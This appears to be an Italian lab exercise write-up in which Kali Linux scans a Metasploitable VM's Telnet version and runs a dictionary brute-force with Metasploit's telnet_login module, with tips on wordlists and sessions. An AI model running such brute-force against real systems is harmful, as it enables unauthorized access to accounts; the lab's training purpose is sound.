Scenari e Configurazioni Preliminari
Configurazione degli IP:
Kali Linux: 192.168.1.25
Metasploitable: 192.168.1.40
Obiettivo: Verificare la versione di Telnet su Metasploitable, identificare vulnerabilità e simulare un attacco brute-force utilizzando dizionari.
Passaggi per l'Esercizio
1. Identificazione della Versione di Telnet
Modulo utilizzato: auxiliary/scanner/telnet/telnet_version
Comandi principali:
Impostare l'IP della macchina target:
bash
Copia codice
set RHOST 192.168.1.40
Eseguire il modulo:
bash
Copia codice
run
Risultati attesi:
Visualizzazione delle informazioni sul servizio Telnet della macchina target.
Raccolta di dettagli utili per ulteriori analisi.
2. Simulazione di un Attacco Brute-Force su Telnet
Modulo utilizzato: auxiliary/scanner/telnet/telnet_login
Passaggi:
Configurare i parametri del modulo:
IP della vittima:
bash
Copia codice
set RHOST 192.168.1.40
File di dizionario per utenti e password:
bash
Copia codice
set USER_FILE <path_file_utenti>
set PASS_FILE <path_file_password>
Abilitare l'arresto al primo successo:
bash
Copia codice
set STOP_ON_SUCCESS true
Regolare il numero di thread per ottimizzare la velocità:
bash
Copia codice
set THREADS 5
Avviare l'attacco:
bash
Copia codice
run
Risultati attesi:
Accesso forzato alla macchina target utilizzando un dizionario.
Identificazione di combinazioni valide di credenziali.
Considerazioni Tecniche
Ottimizzazione dell’Attacco Brute-Force:

Utilizzo di dizionari mirati con dettagli noti (es., lunghezza username, presenza di caratteri speciali) per migliorare l’efficienza.
Possibilità di usare dizionari più estesi come Xato o personalizzati.
Uso di Moduli Complementari:

Per una gestione avanzata, considerare l’uso di sessions per interagire direttamente con la macchina compromessa.
